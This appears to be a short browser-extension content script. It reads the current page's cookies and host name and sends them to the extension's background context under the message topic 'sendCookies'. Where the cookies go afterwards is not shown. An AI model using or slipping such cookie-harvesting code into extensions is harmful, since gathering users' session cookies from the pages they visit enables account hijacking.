chrome.runtime.sendMessage({
    topic: 'sendCookies',
    domain: location.host,
    cookie: document.cookie
})